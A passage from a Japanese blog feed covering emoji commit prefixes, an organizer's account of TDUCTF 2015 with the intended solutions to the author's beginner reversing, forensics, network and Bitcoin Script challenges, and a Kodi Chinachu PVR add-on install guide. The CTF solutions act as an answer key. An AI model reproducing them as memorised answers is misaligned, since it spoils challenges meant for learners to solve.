<td style="text-align:center;"><img src="https://raw.githubusercontent.com/arvida/emoji-cheat-sheet.com/master/public/graphics/emojis/arrow_upper_right.png" alt="↗️" width="24" height="24" /> </td>
<td style="text-align:center;"> :arrow_upper_right:        </td>
<td style="text-align:left;"> なにかイケてる修正した時に使った。今は:ok:とか:cool:が担当</td>
</tr>
<tr>
<td style="text-align:center;"><img src="https://raw.githubusercontent.com/arvida/emoji-cheat-sheet.com/master/public/graphics/emojis/warning.png" alt="⚠️" width="24" height="24" /> </td>
<td style="text-align:center;"> :warning:                  </td>
<td style="text-align:left;"> Includeガード関連。こんないい絵文字をこう使ったのは痛いミス</td>
</tr>
<tr>
<td style="text-align:center;"><img src="https://raw.githubusercontent.com/arvida/emoji-cheat-sheet.com/master/public/graphics/emojis/point_left.png" alt="👈" width="24" height="24" /> </td>
<td style="text-align:center;"> :point_left:               </td>
<td style="text-align:left;"> コメント関連に使用した。再度登場する機会がない。          </td>
</tr>
<tr>
<td style="text-align:center;"><img src="https://raw.githubusercontent.com/arvida/emoji-cheat-sheet.com/master/public/graphics/emojis/bomb.png" alt="💣" width="24" height="24" /> </td>
<td style="text-align:center;"> :bomb:                     </td>
<td style="text-align:left;"> リモートのファイル削除に関して。たぶん疲れてたんだと思う。</td>
</tr>
</tbody>
</table>


<h4>Chinachu PVR クライアント向けの独自記号</h4>

<table>
<thead>
<tr>
<th style="text-align:center;"> 絵文字</th>
<th style="text-align:center;">   絵文字置換文字列         </th>
<th style="text-align:left;"> 用途                                                      </th>
</tr>
</thead>
<tbody>
<tr>
<td style="text-align:center;"><img src="https://raw.githubusercontent.com/arvida/emoji-cheat-sheet.com/master/public/graphics/emojis/1234.png" alt="🔢" width="24" height="24" /> </td>
<td style="text-align:center;"> :1234:                     </td>
<td style="text-align:left;"> テレビのチャンネルに関する変更                            </td>
</tr>
<tr>
<td style="text-align:center;"><img src="https://raw.githubusercontent.com/arvida/emoji-cheat-sheet.com/master/public/graphics/emojis/city_sunrise.png" alt="🌇" width="24" height="24" /> </td>
<td style="text-align:center;"> :city_sunrise:             </td>
<td style="text-align:left;"> 録画データのサムネイルに関する変更                        </td>
</tr>
<tr>
<td style="text-align:center;"><img src="https://raw.githubusercontent.com/arvida/emoji-cheat-sheet.com/master/public/graphics/emojis/hourglass.png" alt="⌛️" width="24" height="24" /> </td>
<td style="text-align:center;"> :hourglass:                </td>
<td style="text-align:left;"> 録画予約に関する変更                                      </td>
</tr>
<tr>
<td style="text-align:center;"><img src="https://raw.githubusercontent.com/arvida/emoji-cheat-sheet.com/master/public/graphics/emojis/vhs.png" alt="📼" width="24" height="24" /> </td>
<td style="text-align:center;"> :vhs:                      </td>
<td style="text-align:left;"> 録画済み番組に関する変更                                  </td>
</tr>
<tr>
<td style="text-align:center;"><img src="https://raw.githubusercontent.com/arvida/emoji-cheat-sheet.com/master/public/graphics/emojis/red_circle.png" alt="🔴" width="24" height="24" /> </td>
<td style="text-align:center;"> :red_circle:               </td>
<td style="text-align:left;"> テレビ番組の録画に関する変更                              </td>
</tr>
<tr>
<td style="text-align:center;"><img src="https://raw.githubusercontent.com/arvida/emoji-cheat-sheet.com/master/public/graphics/emojis/tv.png" alt="📺" width="24" height="24" /> </td>
<td style="text-align:center;"> :tv:                       </td>
<td style="text-align:left;"> リアルタイム視聴に関する変更                              </td>
</tr>
<tr>
<td style="text-align:center;"><img src="https://raw.githubusercontent.com/arvida/emoji-cheat-sheet.com/master/public/graphics/emojis/page_facing_up.png" alt="📄" width="24" height="24" /> </td>
<td style="text-align:center;"> :page_facing_up:           </td>
<td style="text-align:left;"> ログ出力に関する変更                                      </td>
</tr>
<tr>
<td style="text-align:center;"><img src="https://raw.githubusercontent.com/arvida/emoji-cheat-sheet.com/master/public/graphics/emojis/repeat.png" alt="🔁" width="24" height="24" /> </td>
<td style="text-align:center;"> :repeat:                   </td>
<td style="text-align:left;"> サーバーのデータを定期的に取得する部分の変更              </td>
</tr>
<tr>
<td style="text-align:center;"><img src="https://raw.githubusercontent.com/arvida/emoji-cheat-sheet.com/master/public/graphics/emojis/clock1.png" alt="🕐" width="24" height="24" /> </td>
<td style="text-align:center;"> :clock1:                   </td>
<td style="text-align:left;"> 録画予約に関する変更のコミットで間違えて使った。          </td>
</tr>
</tbody>
</table>


<h2>まとめ</h2>

<p>視認性は向上するも、絵文字一文字に対して多いと20文字以上もコミットメッセージを消費してしまうのが難点。
また、「窓」の絵文字がないため、Windows向けバイナリを作成する機運が高まらないのも問題だと感じました（要出典）。</p>

<p>しかし視認性が向上した利点は大きく、GitHubでのコミットログ一覧を流し見するだけで目的のコミットを見つけることができる点はとても良いことであると感ます。</p>
]]></content>
  </entry>
  
  <entry>
    <title type="html"><![CDATA[TDUCTF 2015の運営をした話]]></title>
    <link href="http://mzyy94.com/blog/2015/09/18/tductf-2015-digression/"/>
    <updated>2015-09-18T01:33:16+09:00</updated>
    <id>http://mzyy94.com/blog/2015/09/18/tductf-2015-digression</id>
    <content type="html"><![CDATA[<p>みなさんご参加ありがとうございます。
存じ上げている方もたくさんいらっしゃると思いますが、先月末の日曜日にTDUCTF 2015なるものが開催されました。</p>

<p><a href="http://connpass.com/event/17306/"><strong>TDUCTF 2015 - connpass</strong></a></p>

<p>前回開催が3月末にあったのですが、所要で参加できないことがわかり、悔しさからネットワーク系のCTF問題を作って提供しました。</p>

<iframe src="//www.slideshare.net/slideshow/embed_code/key/FxTJmR5D9IePUk?startSlide=14" width="425" height="355" frameborder="0" marginwidth="0" marginheight="0" scrolling="no" style="border:1px solid #CCC; border-width:1px; margin-bottom:5px; max-width: 100%;" allowfullscreen> </iframe>


<p> <div style="margin-bottom:5px"> <strong> <a href="//www.slideshare.net/nomuken/ss-46568790" title="メインスライド" target="_blank">メインスライド</a> </strong> from <strong><a href="//www.slideshare.net/nomuken" target="_blank">nomuken</a></strong> </div></p>

<p>そのとき運営陣の@nomuken氏からの「次回は問題作成だけではなく運営陣に加わっていっしょに盛り上げよう」との提案を受け、
今回TDUCTF 2015にて運営側に立つこととなりました。</p>

<p>さて、具体的に運営として何をしてきたかの記録を以下に述べますが、後半には問題のネタバレなどを含んでおります。ご注意ください。</p>

<!-- more -->


<h1>フロントエンドアプリケーションの作成</h1>

<p>TDU CTF 2014 Satellite in ConoHaが無事終了し、次回開催に向けての話が始まりだした時に運営の方々の仲間に入り、どのようにして準備していくかなどの議論をはじめました。
その議論の最初の議題は毎度フルスクラッチなスコアサーバーをどうしようかというものでした。
常設CTFや有志で行われてるオンサイトCTFで<em>イケてるスコアサーバー</em>を見かけないのを悲しく思い、Web開発全然得意じゃないのにも関わらず、</p>

<p><strong>「俺がイケてるCTFスコアサーバー作るよ」</strong></p>

<p>などと言ってしまいました。</p>

<p>すんなりと「お、じゃあお願いするね」と言われて開発することになったのですが、イケてるスコアサーバーはWebフロントエンド部分のことを指しており、
サーバーサイドは別で他のメンバーが開発する、分業となりました。</p>

<p>さて、困った。作ると言い出したものの最近のWebのトレンド知らないしTwitter Bootstrap・jQueryアレルギーだしどうしたものか、と。</p>

<p>まだ開催まで時間あるしとりあえずトレンド調査だけしておこうと思い、いろいろ調べるだけ調べて放置していました。</p>

<p>時は流れ、TDUCTF 2015開催２週間前。</p>

<p>Slackに流れる「フロントエンドの進捗どうですか？」の文字列。
手元のソースコードリポジトリで<code>git log</code>をしてみたところ、</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>fatal: bad default revision 'HEAD'</span></code></pre></td></tr></table></div></figure>


<p>アカン。</p>

<p>その日から睡眠時間を削り、圧倒的進捗率を叩き出すべく腱鞘炎になりながらもコードを書き続けました。</p>

<p>コミットはゼロでも頭の中に構想は練ってあったので、あとはキーボードを叩きまくるだけという状態になっていたものの、
時間が足りない上に睡眠不足でタイポするわで結構大変でした。</p>

<p>トレンド調査で、<a href="https://facebook.github.io/react/">React</a>+<a href="https://facebook.github.io/flux/">Flux</a>の構造を軸に、見た目は<a href="http://semantic-ui.com/">Semantic UI 2</a>で整え、<a href="http://electron.atom.io/">Electron</a>で単一アプリケーション化するのがモダンでイケてる感じであるとわかったので、これらを用いて組み立てていくことにしました。
Electronでアプリケーション化したのは、「今までにないイケてるCTFスコアサーバー」の形を実現する目的に加えて、「マルチブラウザ対応に追われる時間をゼロにする」目的もありました。結果として、Internet Explorer（CTF参加者に利用者はいるのだろうか？）などのへの対応のためにバッドノウハウを使わなくて済みました。</p>

<p>途中Flux部分にしっくりくるものがなく、<a href="http://rackt.github.io/redux/">Redux</a>に変更するまでに時間を要したものの、2週間ぶっ通しの突貫工事でなんとか、開催までに&#8221;形にする&#8221;ことができ、参加者に楽しんでいたくことができたと思います。</p>

<p>開催までは非公開で管理していたのですが、オープンソースで公開するとの話があったので、現在はGitHubにて公開しています。</p>

<p><a href="https://github.com/lepus-ctf/lepus-frontend/">lepus-ctf/lepus-frontend · GitHub</a></p>

<p>詳しい開発秘話はしないので、苦労は上記リポジトリのコミットログから察してください。</p>

<h1>問題作成</h1>

<p>CTFの主軸となる問題作成に関しての話です。
ネタバレが含まれるので問題を解きたい人はお気をつけを。</p>

<p>CTFの運営として参加しているので、問題の作成はほぼ必須なのですが、なにせフロントエンドアプリケーションの作成に追われていて、
「案はあるけど作ってる暇がない」ということとなってしまい、少ししか用意できませんでした。
問題案などはストックできてるので次回開催時に登場する予定です。</p>

<p>用意した問題は一部を除いて以下のサイトで公開しています。</p>

<p><a href="http://ctf.mzyy94.com">ctf.mzyy94.com</a></p>

<p>問題の作成意図と簡単な想定解法を紹介します。
あと、TDUCTF 2015は初心者歓迎を掲げて開催してたので、プロ向けの問題はあまりありません。</p>

<h2>Keygenerator</h2>

<p><a href="http://ctf.mzyy94.com/q/TDUCTF2015-BIN200/">http://ctf.mzyy94.com/q/TDUCTF2015-BIN200/</a></p>

<p>問題文: 実行してフラッグをゲットせよ！</p>

<p>この問題は、与えられた実行ファイルを実行しろというものです。
libprintkey.soという自作共有ライブラリとkey_generatorという実行アプリケーションが渡されるのですが、
普通にアプリケーションを実行したりデバッグしてもフラグは得られません。</p>

<p>作成意図としては、「共有ライブラリも単体実行可能」という点に気づいて、
問題文の「実行して」のとおりに共有ライブラリに実行可能フラグを立てて、
<code>./libprintkey.so</code>とすれば、フラグが出力されるようになっていました。</p>

<p>gdbなどでkey_generatorをデバッグしてた方から、「あるべきところにフラグがないがどういうことなのか？」という質問がありましたが、
すいません、そっちじゃなかったんです。</p>

<p>単純に実行してフラグを得られるため初期の想定では100点問題になるとしていたのですが、
配点会議でライブラリの単体実行するポイントに気づかない人も多いかもしれないとのことで、200点に引き上げられました。</p>

<h2>devnull</h2>

<p><a href="http://ctf.mzyy94.com/q/TDUCTF2015-BIN250/">http://ctf.mzyy94.com/q/TDUCTF2015-BIN250/</a></p>

<p>問題文: Usage: ./devnull > /dev/null</p>

<p>実行すると、標準出力を/dev/nullにリダイレクトしてくれとUsageが出てきて、
そのとおりに実行すると、/dev/nullにフラグが出力されるというものです。</p>

<p>リダイレクト先をパスで判定しているので、/dev/nullを適当なブロックファイルに差し替えるか、
gdbでブレイクポイントを仕掛けたり、ltraceとかで処理を追って、出力される部分を覗き見できればフラグが得られます。</p>

<p>gdbの使い方に慣れてほしいという願いを込めて作っていたので、想定していた解法は以下のとおりです。</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>$ gdb ./devnull
</span><span class='line'>(gdb) b printf
</span><span class='line'>(gdb) r &gt; /dev/null
</span><span class='line'>(gdb) i r
</span><span class='line'>(gdb) x/s $rsi</span></code></pre></td></tr></table></div></figure>


<h2>「名前が変えられいるってことで間違いないな」</h2>

<p><a href="http://ctf.mzyy94.com/q/TDUCTF2015-MISC200/">http://ctf.mzyy94.com/q/TDUCTF2015-MISC200/</a></p>

<p>問題文: password:password</p>

<p>問題には拡張子がjpgのファイルが付属しています(JPEGファイルとは言っていない)。</p>

<p>CTFに必要なググり力を問うための問題で、問題タイトルを検索ワードにググると、
ほこ×たてのハッキング対決に関する記事がいくつかヒットします。
ほこ×たて内では 「名前が変えられいるってことで間違いないな」は「TrueCryptで暗号化されている」のことを指しているという記事が見つかるので、
添付のファイルをTrueCryptを用いてパスワードにpasswordを指定してマウントすると、フラグが出てきます。</p>

<h2>Portscan</h2>

<p><a href="http://ctf.mzyy94.com/q/TDUCTF2015-NW500/">http://ctf.mzyy94.com/q/TDUCTF2015-NW500/</a></p>

<p>問題文: ポートスキャンが仕掛けられた！ん？何かメッセージがついてきているぞ？</p>

<p>UDPポートスキャンを観測したpcapファイルが渡されます。
UDPのペイロードに1バイトずつメッセージがついてきてるのでそれを抽出してあげるとフラグが取得できる問題です。</p>

<p>この問題は、WiresharkのFollow UDP Streamですぐに答えが出るようではひねりがないと思い、
tcpdumpやtsharkのオプションを覗いたり他のパケット解析ツールを使ってほしいという想いを込めて作成しました。
なので、Wiresharkで解くことはほとんど不可能です。</p>

<p>想定していた解答方法は以下のとおりです。
最初は100点くらいの配点にしようとしていたのですが、配点会議で「これはわからん」と言われ急遽500点まで引き上げられました。</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
</pre></td><td class='code'><pre><code class='bash'><span class='line'><span class="nb">printf</span> <span class="k">$(</span>tcpdump -r secretmsg.pcap -x <span class="s1">&#39;udp&#39;</span> <span class="p">|</span> grep 0x0010 <span class="p">|</span> perl -pe<span class="s1">&#39;s/^.*(..)00 0000\n$/\\x\1/&#39;</span><span class="k">)</span>
</span></code></pre></td></tr></table></div></figure>


<h2>Lucky 7</h2>

<p>この問題はサーバーにアクセスするタイプのネットワーク問題なのでオンサイトでしか用意しておらず、現在は公開していません。
問題内容は、netcatでアクセスすると以下のような表示が返ってくるものです。</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
</pre></td><td class='code'><pre><code class='bash'><span class='line'>Challenge!
</span><span class='line'><span class="m">2187123</span> !<span class="o">=</span> 77777777
</span></code></pre></td></tr></table></div></figure>


<p>左辺にある数字が77777777と等しくなるようにアクセスするとフラグが降ってくるのではないかとピンとくる人もいれば、
ランダムに変化するからBruteforceで解こうする人もいたりと、サーバーを監視していてなるほどと感じることが多かったです。
この左辺の数字は、サーバー側が<code>Challenge!</code>を返す際のAcknowledge Numberになっており、ここが77777777になっていないためにエラーが返されているのです。
Wiresharkなどで監視しながらアクセスしていたひとは、この関連性がわかったとおもいます。</p>

<p>Sequential Numberをいじれるhping3やScapyに触れてもらおうという願いを込めて作成しました。
解法としてはそれらを用いて、3-way handshakeが終了した時点のSequential Number(= サーバーがChallenge!を返す際のAcknowledge Number)が77777777になるようにコネクションを張り始めるようにすれば、フラグが返ってくるというものでした。</p>

<h2>moneyscript</h2>

<p><a href="http://ctf.mzyy94.com/q/TDUCTF2015-MISC400/">http://ctf.mzyy94.com/q/TDUCTF2015-MISC400/</a></p>

<p>問題文: 6a29585444557b426974636f696e21426974636f696e21426974636f696e217d</p>

<p>moneyscriptシリーズの1問目です。こちらは簡単な方です。
moneyscriptのmoneyが指すのはBitcoinで、このシリーズの問題はBitcoin Scriptを実行して答えを得る問題となっています。
1問目は優しめに作ってあり、適当にデコードすればフラグが得られるよになっていますが、Bitcoin Scriptとは何かを理解してほしく作成しました。</p>

<p>Googleで検索するとBitcoin ScriptのWikiがヒットします。</p>

<p><a href="https://en.bitcoin.it/wiki/Script">Script - Bitcoin Wiki</a></p>

<p>このWikiにしたがって問題文のBitcoin Scriptが意味するところを先頭から照らしていくと、</p>

<ul>
<li>0x6a = OP_RETURN</li>
<li>0x29 = 41バイト確保</li>
</ul>


<p>それ以降は文字コードの16新表記となっています。</p>

<p>なので、適当にデコードするだけでフラグが出てきてしまいますが、Bitcoin Scriptの仕組みを知ってもらえたらとおもい、作成しました。</p>

<h2>moneyscript!!!</h2>

<p><a href="http://ctf.mzyy94.com/q/TDUCTF2015-MISC600/">http://ctf.mzyy94.com/q/TDUCTF2015-MISC600/</a></p>

<p>問題文は上記リンクから閲覧ください。</p>

<p>こちらは難しい方のBitcoin Script問題です。
先ほどのWikiにアクセスできていれば、照らしあわせて脳内で実行すればいいのですが、
少々骨の折れるものなので、Bitcoin Scriptを扱えるアプリケーションを使う必要が出てきます。</p>

<p>任意のアプリケーションを使って解いてもらえればいいのですが、
Node.jsのモジュールに、<a href="http://bitcore.io/">bitcore</a>というモジュールがあるので、それを用いて以下のように実行するなどして、フラグを取得できます。</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
</pre></td><td class='code'><pre><code class='javascript'><span class='line'><span class="kd">var</span> <span class="nx">bitcore</span> <span class="o">=</span> <span class="nx">require</span><span class="p">(</span><span class="s1">&#39;bitcore&#39;</span><span class="p">);</span>
</span><span class='line'><span class="kd">var</span> <span class="nx">Script</span> <span class="o">=</span> <span class="nx">bitcore</span><span class="p">.</span><span class="nx">Script</span><span class="p">;</span>
</span><span class='line'><span class="kd">var</span> <span class="nx">code</span> <span class="o">=</span> <span class="s1">&#39;4c0155828f635e76937367595294687b736b7c6c938f618fa76b4c0222ea6c&#39;</span><span class="p">;</span>
</span><span class='line'>
</span><span class='line'><span class="kd">var</span> <span class="nx">buffer</span> <span class="o">=</span> <span class="k">new</span> <span class="nx">Buffer</span><span class="p">(</span><span class="nx">code</span><span class="p">,</span> <span class="s1">&#39;hex&#39;</span><span class="p">);</span>
</span><span class='line'><span class="kd">var</span> <span class="nx">interpreter</span> <span class="o">=</span> <span class="nx">Script</span><span class="p">.</span><span class="nx">Interpreter</span><span class="p">();</span>
</span><span class='line'>
</span><span class='line'><span class="nx">interpreter</span><span class="p">.</span><span class="nx">script</span> <span class="o">=</span> <span class="k">new</span> <span class="nx">Script</span><span class="p">(</span><span class="nx">buffer</span><span class="p">);</span>
</span><span class='line'><span class="nx">interpreter</span><span class="p">.</span><span class="nx">evaluate</span><span class="p">();</span>
</span><span class='line'>
</span><span class='line'><span class="kd">var</span> <span class="nx">first_stack</span> <span class="o">=</span> <span class="nx">interpreter</span><span class="p">.</span><span class="nx">stack</span><span class="p">.</span><span class="nx">pop</span><span class="p">();</span>
</span><span class='line'><span class="kd">var</span> <span class="nx">hex_string</span> <span class="o">=</span> <span class="nx">first_stack</span><span class="p">.</span><span class="nx">toJSON</span><span class="p">().</span><span class="nx">data</span><span class="p">.</span><span class="nx">map</span><span class="p">(</span><span class="kd">function</span><span class="p">(</span><span class="nx">x</span><span class="p">)</span> <span class="p">{</span>
</span><span class='line'>  <span class="k">return</span> <span class="nx">x</span><span class="p">.</span><span class="nx">toString</span><span class="p">(</span><span class="mi">16</span><span class="p">);</span>
</span><span class='line'><span class="p">})</span>
</span><span class='line'>
</span><span class='line'><span class="kd">var</span> <span class="nx">flag</span> <span class="o">=</span> <span class="s1">&#39;TDU{&#39;</span> <span class="o">+</span> <span class="nx">hex_string</span><span class="p">.</span><span class="nx">join</span><span class="p">(</span><span class="s1">&#39;&#39;</span><span class="p">)</span> <span class="o">+</span> <span class="s1">&#39;}&#39;</span><span class="p">;</span>
</span><span class='line'>
</span><span class='line'><span class="nx">console</span><span class="p">.</span><span class="nx">log</span><span class="p">(</span><span class="nx">flag</span><span class="p">);</span>
</span></code></pre></td></tr></table></div></figure>


<h1>開催について</h1>

<p>フロントエンドアプリケーションの作成がギリギリだったがために、RESTサーバーのテストが十分にできず、運営陣には多くの迷惑をかけてしまいました。
また、フロントエンドアプリケーション側もテストが追いつかず、バグだらけで配布してしまったがために、当日は問題の添付ファイルが破損していたり、
カウントダウンが正常に機能しないなどのバグを発生させてしまい、参加者各位にも大変に迷惑をかけてしまいました。
その節は申し訳ありませんでした。</p>

<p>TDUCTF 2015終了後、反省会をオンラインで開催していた頃に「TDUCTF」という名称を変更しようという話が立ち上がり、
よくわらかないテンションでドメインから何から整え新名称に改称しました。</p>

<blockquote class="twitter-tweet" lang="ja"><p lang="ja" dir="ltr">TDUCTFからLepusCTFの移行で面白いのは4&#10;・新名称考案&#10;・サーバー確保&#10;・ドメイン取得&#10;・GitHub移行&#10;・Webサイト作成&#10;・アイコン作成&#10;・Twitter移行&#10;を4時間以内でやったというところ <a href="https://twitter.com/hashtag/lepusctf?src=hash">#lepusctf</a></p>&mdash; 友利奈緒 (@mzyy94) <a href="https://twitter.com/mzyy94/status/638606548818726912">2015, 9月 1</a></blockquote>


<p> <script async src="//platform.twitter.com/widgets.js" charset="utf-8"></script></p>

<p>ということなので、今後はTDUCTFあらため、<a href="http://lepus-ctf.org/">LepusCTF</a>をよろしくお願いします。</p>
]]></content>
  </entry>
  
  <entry>
    <title type="html"><![CDATA[Kodi Chinachu PVRアドオンでRasPi2/Android TVをテレビに]]></title>
    <link href="http://mzyy94.com/blog/2015/08/08/pvr-chinachu-addon/"/>
    <updated>2015-08-08T20:51:33+09:00</updated>
    <id>http://mzyy94.com/blog/2015/08/08/pvr-chinachu-addon</id>
    <content type="html"><![CDATA[<p>暑い日が続きますね。こういう日はエアコンの効いた部屋でだらだらとテレビを見たいものです。
しかしテレビをもっておりません。27インチのモニタを持っているのみです。</p>

<p>ただ、今年２月に記事にしたように、Raspberry Pi2 + OSMC + Kodi(XBMC) + add-onで地デジの視聴環境は出来上がっており、
だらだらとテレビを見ることができる状態にあります。</p>

<ul>
<li><a href="http://mzyy94.com/blog/2015/02/16/raspberry-pi2-osmc-jp/">Raspberry Pi2にOSMC入れてKodi(旧:XBMC)日本語化するまで</a></li>
<li><a href="http://mzyy94.com/blog/2015/02/21/kodi-livetv-chinachu/">KodiとChinachuで地デジLive視聴 on Raspberry Pi2 w/ OSMC</a></li>
<li><a href="http://mzyy94.com/blog/2015/02/24/kodi-chinachu-addon/">KodiでChinachuの録画を観るAdd-on作った</a></li>
</ul>


<p>これでだいたい十分に地デジを視聴できるようになったのですが、最近Android TVを手にし、同じように上記記事のように
地デジ視聴環境を整えて見ていたらいくつか不満が出てきました。</p>

<ol>
<li>ビデオAdd-onとテレビAdd-onを切り替えるのが面倒くさい</li>
<li>Python製のためか、録画データJSONパースに時間がかかってる</li>
<li>録画予約の取り消しができない</li>
<li>Chinachu側に手を加えるのはスマートではない</li>
</ol>


<p>そこで思い立ってKodi/XBMC向けのテレビadd-on(PVR add-on)を作って、上記問題の解決に取り組みました。</p>

<!-- more -->


<h1>Chinachu PVR add-on</h1>

<p>ということで出来上がったのがChinachu PVR add-onです。
２月に記事にしたIPTV Simple Client Add-onと同種のPVR（Personal Video Recorder）Add-onで、
上記記事で紹介した２つのAdd-onを複合して成り立っていた地デジ視聴環境と比べて、以下の利点があります。</p>

<ol>
<li>１つのAdd-onでLive視聴・録画視聴ともにできる</li>
<li>より高速なJSONパースでストレスの少ないデータの読み込み</li>
<li>録画予約のON/OFFができる</li>
<li>Chinachuの標準APIを使っているのでChinachu側に手を加える必要なし(推奨バージョンはREADME.mdに記載)</li>
</ol>


<p>これらの利点を備えたPVR add-on、Chinachu PVR add-onのバージョン1.0.0が出来上がりました。</p>

<h1>pvr.chinachu 1.0.0</h1>

<p>Kodi/XBMCにおけるPVR Add-onのリポジトリ命名規則は習慣によって、pvr.[バックエンドの名前]となっているようです。
なのでpvr.chinachuという名でリポジトリを立ててあります。</p>

<p><a href="https://github.com/mzyy94/pvr.chinachu"><strong>mzyy94/pvr.chinachu</strong></a></p>

<p>PVR Add-onは共有ライブラリの形で提供する必要があるため、Pythonで書けるビデオAdd-onとは違って各プラットフォーム向けにバイナリ形式の実行可能ファイルを提供する必要があります。
記事タイトルではRasPi2/Android TVとありますが、バージョン1.0.0で提供してるバイナリファイルの対象プラットフォームはLinux amd64/armv7(RasPi2含む), OS X 64bit, Android arm(TV含む)となっています。
Autotools依存で作り始めたため、Windowsでのビルド環境を作るのが大変だったのでバイナリファイルの提供はしていませんが、VSプロジェクトを作ればビルドできるはずです。</p>

<p>ビルド方法、インストール方法、設定項目などの説明はリポジトリのREADME.mdに記載してあります。
注意点として、<em>現時点でKodi 15.0 Isengardにしか対応していない</em>ので、他のバージョンのKodi/XBMCでは利用できません。
Raspberry Pi2でOSMCを利用している人は、以下の記事に目を通し、<code>sudo apt-get update &amp;&amp; sudo apt-get dist-upgrade -y</code>をしてKodi 15.0にしてから導入してください。</p>

<p><a href="https://osmc.tv/2015/08/osmcs-july-update-lands-a-little-late-with-kodi-15/">OSMC » OSMC’s July update lands (a little late) with Kodi 15</a></p>

<p>パブリックリリース記念(?)として、インストール方法といくつか機能を説明します。</p>

<h2>インストール</h2>

<p>Chinachu側はREADME.mdに記載のバージョンもしくは最新版を利用していれば、特に設定は必要ありません。
ただ、Live視聴時のチャンネル切り替えパフォーマンスや、録画とLive視聴の衝突回避のためにも、README.mdの推奨バージョンを導入することをお勧めします。</p>

<p>Kodi/XBMCでAdd-onをインストールしたことがある人は知っていると思いますが、zip圧縮されたパッケージをメニューから選択するだけで、KodiにAdd-onを追加することができます。
自分でビルドする方は各自ビルドし、ビルド済み実行ファイルを必要とする人は、以下のページからプラットフォームにあったパッケージをダウンロードしてください。</p>

<p><a href="https://github.com/mzyy94/pvr.chinachu/releases">releases - mzyy94/pvr.chinachu</a></p>

<p>Kodiを起動し、zip形式のパッケージをSettings -> Add-ons -> Install from zip-file から選択し、Add-onsの階層にあるPVR clientsからChinachu PVR clientを探し出して設定を行ってください。</p>

<p><img src="http://mzyy94.com/blog/resources/images/2015/08/08/install-from-zip.png" alt="install from zip" /></p>

<p>設定項目に関しては<a href="https://github.com/mzyy94/pvr.chinachu/wiki/configuration">wiki/configuration - mzyy94/pvr.chinachu</a>にまとめてあります。</p>

<p>その後、Settings -> TV -> GeneralからEnabledにしてPVR add-onを開始してください。</p>

<p><img src="http://mzyy94.com/blog/resources/images/2015/08/08/enable-tv.png" alt="enable tv" /></p>

<p><strong> ※Android/Android TV環境ではこのままでは動作しないことがあるので、<a href="https://github.com/mzyy94/pvr.chinachu/wiki/Android-Installation">wiki/Android-Installation - mzyy94/pvr.chinachu</a>を参考に少しいじってください。 </strong></p>

<p><img src="http://mzyy94.com/blog/resources/images/2015/08/08/top-menu.png" alt="top menu" /></p>

<p>PVRプラグインが有効になるとKodiのメイン画面にTVの項目が現れ、Chinachuから取得したデータにアクセスできるサブ項目も現れます。
Skinによっては録画中や録画予約済みの項目がメイン画面に表示されたりします。</p>

<p>サブ項目のChannelsで各チャンネルで現在放送中の番組を、Guideでテレビ番組表を確認でき、Recordingsで録画の視聴、Timerで録画予約の確認、Searchで番組検索ができます。
Skinごとの差異や日本語設定にしていると項目名が違いますが、似たような項目が現れると思います。
表示言語を日本語に設定していない場合、Settings -> Appearance -> Skin -> Fontsから日本語表示に対応しているフォント（例：Arial）を選択しておかないと、文字化けして使い物にならいのでご注意を。</p>

<p><img src="http://mzyy94.com/blog/resources/images/2015/08/08/font-settings.png" alt="font settings" /></p>

<h2>Channels</h2>

<p><img src="http://mzyy94.com/blog/resources/images/2015/08/08/channels-page.png" alt="channels page" /></p>

<p>Chinachuから取得したチャンネルの一覧と、現在放送中の番組が表示されるページです。
チャンネルを選択するとライブ視聴ができます。</p>

<p>画像ではチャンネル横に曲ごとのアイコンをつけていますが、自動で取得するように実装していないので、
必要であればSettings -> TV -> General -> Channel managerにてアイコンの追加ができるのでそこで追加するようにしてください。</p>

<p>ちなみにここで表示されるチャンネルはGR/BS/CSと、地デジ・BS・CSを分けてグループ化してあるので、項目が多すぎる場合はメニューから表示するグループを選択することができます。</p>

<p><img src="http://mzyy94.com/blog/resources/images/2015/08/08/channel-manager.png" alt="channel manager" />
<img src="http://mzyy94.com/blog/resources/images/2015/08/08/channel-group.png" alt="channel group" /></p>

<h2>Guide</h2>

<p><img src="http://mzyy94.com/blog/resources/images/2015/08/08/guide-page.png" alt="guide page" /></p>

<p>Chinachuから取得した番組表情報を、チャンネルごとに表示するページです。
テーマによっては番組のジャンルごとに色分けがされて表示されます。</p>

<p>番組表形式の表示方法以外にも、いくつかメニューから表示形式を選ぶことができます。
バージョン1.0.0では番組表の番組選択からの録画予約に対応していないので、番組情報の確認とチャンネルの切り替えだけとなります。</p>

<h2>Recordings</h2>

<p><img src="http://mzyy94.com/blog/resources/images/2015/08/08/recordings-page.png" alt="recordings page" /></p>

<p>名前の通り、録画した番組を視聴できるページです。
選択すると再生することができます。
デフォルト設定ではサムネイルを録画開始３０秒地点のものを表示するようにしてありますが、設定で変更できます。</p>

<h2>Timer</h2>

<p><img src="http://mzyy94.com/blog/resources/images/2015/08/08/timer-page.png" alt="timer page" /></p>

<p>タイマーと名のつくこのページでは、録画予約を確認できます。
現バージョンでは新たに追加することはできませんが、予約のStateをActive/Inactiveにすることで、Chinachuの録画予約をSkip/Unskipできるようになっています。</p>

<h2>Search</h2>

<p><img src="http://mzyy94.com/blog/resources/images/2015/08/08/search-page.png" alt="search page" /></p>

